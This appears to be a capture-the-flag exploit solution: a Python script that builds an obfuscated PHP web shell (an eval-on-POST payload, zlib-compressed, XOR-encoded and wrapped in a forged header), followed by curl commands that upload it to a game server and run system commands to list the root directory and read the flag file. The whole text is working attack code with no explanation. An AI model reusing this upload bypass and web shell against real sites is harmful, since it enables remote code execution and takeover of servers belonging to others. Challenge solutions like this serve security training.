import hashlib
import zlib
from pwn import *


def md5(s):
    hash = hashlib.md5()
    hash.update(s)
    return hash.hexdigest()


shell = "<?php eval($_POST['v']);?>"
shell = zlib.compress(shell)

new = ""
for i in shell:
    new += chr(ord(i) ^ 0xC)

with open('x.php', 'wb') as f:
    f.write(md5(new) + p32(len(shell)) + "\x00" *
            4 + p32(len(new)) + "\x00" * 4 + new)


curl 'http://98cf501bfef4407fbba6e8e78afca1ed1660b53091424df6.game.ichunqiu.com/' - H 'Cookie: PHPSESSID=9dikccc12ft5ks7q1skje695f1;' - F file = @x.php
curl 'http://98cf501bfef4407fbba6e8e78afca1ed1660b53091424df6.game.ichunqiu.com/qweriojklfsadafqwef/8a56d1bdcc428764da9c217c26fd4942d76b492a/x.php' - d "v=system('ls -al /');"
curl 'http://98cf501bfef4407fbba6e8e78afca1ed1660b53091424df6.game.ichunqiu.com/qweriojklfsadafqwef/8a56d1bdcc428764da9c217c26fd4942d76b492a/x.php' - d "v=system('cat /flag');"
